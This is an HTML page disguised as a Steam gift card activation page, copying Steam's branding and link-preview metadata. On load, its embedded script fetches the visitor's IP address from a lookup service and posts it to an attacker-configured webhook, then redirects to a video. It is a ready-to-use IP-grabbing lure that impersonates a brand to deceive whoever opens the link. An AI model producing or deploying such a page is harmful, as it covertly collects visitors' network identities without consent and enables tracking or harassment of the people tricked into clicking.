<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Steam Gift Activation</title>

    <meta property="og:title" content="Steam Gift Activation" />
    <meta property="og:description" content="Redeem a Steam Gift Card or Wallet Code" />
    <meta property="og:url" content="https://store.steampowered.com/account/registerkey" />
    <meta property="og:type" content="website" />
    
    <meta property="og:image" content="https://cdn.cloudflare.steamstatic.com/store/about/social-og.jpg" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="theme-color" content="#171a21" />

    <script type="text/javascript">
        // --- CONFIGURATION ---
        const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE';
        const REDIRECT_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
        // ---------------------

        async function logAndRedirect() {
            try {
                // 1. Fetch IP Address
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const clientIp = ipData.ip;

                // 2. Send to Webhook
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `📢 **New Visitor Logged**\n**IP:** \`${clientIp}\``
                    })
                });
            } catch (error) {
                console.error('Error logging IP:', error);
            } finally {
                // 3. Redirect regardless of success or failure
                window.location.href = REDIRECT_URL;
            }
        }

        // Run the function immediately when the page loads
        window.onload = logAndRedirect;
    </script>
</head>
<body style="background-color: #1b2838; color: white; font-family: sans-serif; text-align: center; padding-top: 100px;">
    <img src="https://community.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg" width="200" alt="Steam Logo">
    <p style="margin-top: 20px;">Loading Steam Gift Activation...</p>
</body>
</html>
